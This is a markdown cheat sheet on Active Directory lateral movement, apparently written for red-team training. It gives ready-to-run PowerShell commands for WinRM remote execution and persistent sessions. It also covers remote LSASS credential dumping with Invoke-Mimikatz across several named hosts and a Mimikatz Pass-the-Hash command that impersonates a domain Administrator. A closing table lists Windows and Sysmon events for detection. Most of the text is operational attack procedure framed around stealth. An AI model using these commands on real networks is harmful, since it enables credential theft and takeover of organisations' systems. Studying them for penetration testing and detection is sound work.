# 🚀 Active Directory Lateral Movement & Remote Execution

## 🎯 1. Lateral Movement Overview (MITRE ATT&CK [TA0008])

**Lateral Movement** involves techniques that adversaries use to extend access and control across systems on a network. After achieving local administrative privileges on an initial foothold, the objective is to pivot across domain workstations and member servers to locate sensitive data, domain-level credentials, or critical tier-0 assets (e.g., Domain Controllers).

### Core Lateral Movement Vectors in Windows/AD
* **PowerShell Remoting (WinRM):** Legitimate management protocol running over HTTP/HTTPS; low disk-forensic footprint.
* **Windows Management Instrumentation (WMI / DCOM):** Direct management interface via RPC (TCP 135 + dynamic high ports); executes commands without spawning permanent services.
* **Service Control Manager (SMB / RPC):** Traditional execution vector (e.g., PsExec) that creates remote services; noisier on disk and event logs.
* **Remote In-Memory Injection / Delegation Abuse:** Leveraging in-memory toolsets (like `Invoke-Mimikatz`) over remoting sessions.

---

## ⚡ 2. PowerShell Remoting (WinRM) Mechanics

### Architecture & Default Ports
PowerShell Remoting relies on the **Windows Remote Management (WinRM)** service (WS-Management protocol).

| Protocol / Port | Transport | Default Status |
| :--- | :--- | :--- |
| **TCP 5985** | HTTP (Encrypted with Kerberos/NTLM session keys) | Enabled by default on Windows Server 2012+ |
| **TCP 5986** | HTTPS (Requires an SSL/TLS Certificate) | Optional / Configurable |

> **OpSec Advantage:** WinRM traffic over port 5985 is naturally encrypted at the application layer via SPNEGO/Kerberos tokens, blending in with legitimate administrative management traffic.

### Enabling PSRemoting (Administrative Context)
If WinRM is disabled on a target or workstation:
```powershell
Enable-PSRemoting -SkipNetworkProfileCheck -Force -Verbose

```

---

## 🛠️ 3. WinRM Lateral Movement Execution Workflows

### Approach A: One-to-Many Execution (`Invoke-Command`)

Execute commands across one or multiple remote machines simultaneously without establishing an interactive console session.

```powershell
# 1. Ad-hoc remote command execution
Invoke-Command -ComputerName "Windows-Server" -ScriptBlock { whoami; hostname; ipconfig }

# 2. Multi-target simultaneous execution
Invoke-Command -ComputerName @("DC01", "FILESRV01", "WS01") -ScriptBlock { Get-Process }

```

### Approach B: Persistent Session Management (`PSSession`)

Maintain a persistent PowerShell environment on the target to preserve variables, functions, and state.

```powershell
# 1. Create a persistent remote session
$session = New-PSSession -ComputerName "Windows-Server" -Verbose

# 2. Execute script blocks inside the established session
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }

# 3. Enter an interactive remote PowerShell shell
Enter-PSSession -Session $session -Verbose

# 4. Enumerate Kerberos tickets cached in the current session
klist

# 5. Exit the interactive shell (leaves background session alive)
exit

# 6. Clean up the session when complete
Remove-PSSession -Session $session

```

---

## 💀 4. Remote In-Memory Credential Harvesting via `Invoke-Mimikatz`

`Invoke-Mimikatz` uses PowerShell reflection to inject Mimikatz into memory, eliminating the need to write `mimikatz.exe` to disk on target hosts.

### Remote Multi-Host Credential Dumping

Execute credential dumping across multiple remote domain machines over WinRM/RPC in a single command:

```powershell
# Import script locally
. .\Invoke-Mimikatz.ps1

# Dump LSASS credentials locally (requires local Administrator)
Invoke-Mimikatz -DumpCreds -Verbose

# Execute remote credential dumping across multiple target computers
Invoke-Mimikatz -DumpCreds -ComputerName @("DC01", "FILESRV01", "WS01") -Verbose

```

---

## 🔄 5. Pass-the-Hash (PtH) & Process Spawning

When cleartext passwords are unavailable, use the extracted NTLM hash of an administrative domain account to spawn a process under the target's identity token:

```powershell
# Execute Pass-the-Hash using Mimikatz sekurlsa::pth module
Invoke-Mimikatz -Command ' "sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp /rc4:<NTLM_HASH> /run:powershell.exe" ' -Verbose

```

### Parameters Breakdown

* **/user:** Target administrative account.
* **/domain:** Target Active Directory domain name.
* **/rc4:** The NTLM hash of the account (used as the RC4 key for authentication).
* **/run:** The process binary to instantiate with the impersonated token.

> **Operational Flow:** The spawned `powershell.exe` window now possesses network credentials for `cyberwarfare.corp\Administrator`. All subsequent network interactions (e.g., `Enter-PSSession`, `Invoke-Command`, `dir \\DC01\C$`) authenticate using the passed hash.

---

## 🛡️ 6. Defensive Monitoring & Detection

| Technique | Detection Vector | Event Log / Artifact |
| --- | --- | --- |
| **WinRM Connections** | Network logon over ports `5985`/`5986` | **Windows Security Event ID 4624** (Logon Type 3) + Microsoft-Windows-WinRM/Operational. |
| **PowerShell Script Block Logging** | Inspection of de-obfuscated script code at runtime | **Windows Event ID 4104** (Script Block Execution). |
| **LSASS Memory Access** | In-memory extraction tools touching `lsass.exe` | **Sysmon Event ID 10** (Process Access to `lsass.exe` with granted access rights like `0x1010` or `0x1FFFFF`). |
| **Explicit Credential Logons** | Spawning processes with alternate credentials (PtH) | **Windows Security Event ID 4648** (A logon was attempted using explicit credentials). |

```
```